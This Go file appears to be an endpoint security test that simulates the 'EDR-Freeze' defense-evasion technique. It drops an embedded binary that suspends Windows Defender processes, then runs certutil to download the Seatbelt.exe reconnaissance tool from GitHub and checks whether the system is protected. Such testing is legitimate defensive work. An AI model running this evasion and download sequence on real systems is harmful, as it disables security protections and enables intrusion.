//go:build windows
// +build windows

/*
ID: 87b7653b-2cee-44d4-9d80-73ec94d5e18e
NAME: EDR-Freeze Defense Evasion
TECHNIQUE: T1562.001, T1055, T1574
UNIT: response
CREATED: 2025-09-23 18:45:00.000000
*/
package main

import (
	_ "embed"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	Dropper "github.com/preludeorg/libraries/go/tests/dropper"
	Endpoint "github.com/preludeorg/libraries/go/tests/endpoint"
)

//go:embed EDR-Freeze.exe
var edrFreezeExe []byte

func findDefenderPID() (int, string, error) {
	defenderProcesses := []string{
		"MsMpEng.exe",
		"MpDefenderCoreService.exe",
		"NisSrv.exe",
	}

	for _, procName := range defenderProcesses {
		cmd := exec.Command("tasklist", "/FI", fmt.Sprintf("IMAGENAME eq %s", procName), "/FO", "CSV", "/NH")
		output, err := cmd.Output()
		if err != nil {
			continue
		}

		lines := strings.Split(strings.TrimSpace(string(output)), "\n")
		for _, line := range lines {
			if strings.Contains(line, procName) {
				fields := strings.Split(line, ",")
				if len(fields) >= 2 {
					pidStr := strings.Trim(fields[1], "\"")
					var pid int
					_, err := fmt.Sscanf(pidStr, "%d", &pid)
					if err == nil && pid > 0 {
						return pid, procName, nil
					}
				}
			}
		}
	}

	return 0, "", fmt.Errorf("no Defender process found")
}

func test() {
	if err := Endpoint.Dropper(Dropper.Dropper); err != nil {
		Endpoint.Say("Dropper initialization failed: %v", err)
		Endpoint.Stop(Endpoint.UnexpectedTestError)
	}

	targetDir := "c:\\F0"
	os.MkdirAll(targetDir, 0755)

	edrFreezePath := filepath.Join(targetDir, "EDR-Freeze.exe")
	err := os.WriteFile(edrFreezePath, edrFreezeExe, 0755)
	if err != nil {
		Endpoint.Say("Failed to drop EDR-Freeze.exe: %v", err)
		Endpoint.Stop(Endpoint.UnexpectedTestError)
	}

	Endpoint.Say("Checking for defensive reaction to EDR-Freeze.exe")
	Endpoint.Wait(3)

	if Endpoint.Quarantined("EDR-Freeze.exe", edrFreezeExe) {
		Endpoint.Say("EDR-Freeze.exe was quarantined!")
		Endpoint.Stop(Endpoint.FileQuarantinedOnExtraction)
	}

	Endpoint.Say("Finding Windows Defender process...")
	defenderPID, procName, err := findDefenderPID()
	if err != nil {
		Endpoint.Say("Could not find Defender process: %v", err)
		Endpoint.Say("Test cannot proceed without target process")
		Endpoint.Stop(Endpoint.UnexpectedTestError)
	}

	Endpoint.Say("Found Defender process: %s (PID: %d)", procName, defenderPID)

	Endpoint.Say("Executing EDR-Freeze to suspend Defender for 10 seconds...")
	cmd := exec.Command(edrFreezePath, fmt.Sprintf("%d", defenderPID), "10000")
	cmd.Dir = targetDir
	err = cmd.Start()
	if err != nil {
		Endpoint.Say("EDR-Freeze execution blocked: %v", err)
		Endpoint.Stop(Endpoint.ExecutionPrevented)
	}

	Endpoint.Say("EDR-Freeze started, waiting 2 seconds for suspension to take effect...")
	Endpoint.Wait(2)

	Endpoint.Say("Testing if Defender is suspended by downloading malicious tool with certutil...")
	seatbeltPath := "c:\\F0\\Seatbelt.exe"
	certutilCmd := exec.Command("certutil.exe", "-urlcache", "-f",
		"https://github.com/Flangvik/SharpCollection/raw/refs/heads/master/NetFramework_4.7_x86/Seatbelt.exe",
		seatbeltPath)
	certutilCmd.Dir = targetDir

	certOutput, certErr := certutilCmd.CombinedOutput()

	if certErr != nil {
		Endpoint.Say("Certutil download was blocked: %v", certErr)
		Endpoint.Say("Defender prevented malicious download - system is protected")
		Endpoint.Stop(Endpoint.ExecutionPrevented)
	}

	if _, err := os.Stat(seatbeltPath); err == nil {
		Endpoint.Say("Certutil successfully downloaded Seatbelt.exe")
		Endpoint.Say("Defender was successfully suspended - system is unprotected")
		os.Remove(seatbeltPath)
		Endpoint.Stop(Endpoint.Unprotected)
	}

	Endpoint.Say("Download outcome unclear: %s", string(certOutput))
	Endpoint.Stop(Endpoint.ExecutionPrevented)
}

func main() {
	Endpoint.Say("EDR-Freeze Defense Evasion Test")
	Endpoint.Say("Test ID: 87b7653b-2cee-44d4-9d80-73ec94d5e18e")
	Endpoint.Say("Starting at: %s", time.Now().Format("2006-01-02T15:04:05"))

	done := make(chan bool, 1)
	go func() {
		test()
		done <- true
	}()

	select {
	case <-done:
		Endpoint.Say("Test completed within timeout window")
	case <-time.After(2 * time.Minute):
		Endpoint.Say("Test timed out after 2 minutes")
		Endpoint.Stop(Endpoint.TimeoutExceeded)
	}
}
